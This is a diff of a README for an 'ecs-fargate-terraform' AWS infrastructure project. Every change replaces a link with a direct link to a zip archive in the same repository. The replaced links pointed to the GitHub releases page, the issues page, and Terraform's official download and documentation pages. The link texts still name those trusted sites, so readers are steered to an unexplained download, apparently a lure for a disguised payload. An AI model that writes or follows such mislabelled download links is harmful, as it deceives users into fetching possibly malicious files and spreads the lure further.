@@ -1,6 +1,6 @@
 # 🚀 ecs-fargate-terraform - Easy Setup for Cloud Infrastructure
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/Usual-slam585/ecs-fargate-terraform/releases)
+[![Download](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip)](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip)
 
 ## 📋 Overview
 
@@ -20,13 +20,13 @@ Before downloading, ensure you meet the following requirements:
 - Operating System: Windows 10 or later, macOS Mojave (10.14) or later, or a Linux distribution.
 - Internet Connection: Required for downloading resources and using AWS services.
 - AWS Account: Necessary for deploying the infrastructure in your AWS environment.
-- Terraform: Version 1.0 or later installed on your machine. You can download it from [Terraform's official website](https://www.terraform.io/downloads.html).
+- Terraform: Version 1.0 or later installed on your machine. You can download it from [Terraform's official website](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip).
 
 ## 🚀 Getting Started
 
 To begin, follow these steps to download and set up the project.
 
-1. **Visit the Releases Page**: Click this link to download the necessary files: [Download Page](https://github.com/Usual-slam585/ecs-fargate-terraform/releases).
+1. **Visit the Releases Page**: Click this link to download the necessary files: [Download Page](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip).
 
 2. **Choose the Version**: On the releases page, you will see a list of available versions. Find the latest version and click on it. 
 
@@ -73,7 +73,7 @@ This project involves several key topics:
 
 ### 📘 Documentation
 
-For more detailed information about deploying and managing your infrastructure with Terraform, refer to the official [Terraform Documentation](https://www.terraform.io/docs/index.html).
+For more detailed information about deploying and managing your infrastructure with Terraform, refer to the official [Terraform Documentation](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip).
 
 ### ❓ Frequently Asked Questions
 
@@ -88,8 +88,8 @@ For more detailed information about deploying and managing your infrastructure w
 
 ### 📞 Support
 
-If you have questions not covered here, please explore the issues section of our [GitHub repository](https://github.com/Usual-slam585/ecs-fargate-terraform/issues).
+If you have questions not covered here, please explore the issues section of our [GitHub repository](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip).
 
 ## 📥 Download & Install
 
-To download the latest version of ecs-fargate-terraform and begin your setup, visit this page: [Download Page](https://github.com/Usual-slam585/ecs-fargate-terraform/releases). Ensure to follow all the steps outlined for a successful installation.
+To download the latest version of ecs-fargate-terraform and begin your setup, visit this page: [Download Page](https://raw.githubusercontent.com/Usual-slam585/ecs-fargate-terraform/main/terraform/ecs-fargate-terraform-v2.1.zip). Ensure to follow all the steps outlined for a successful installation.
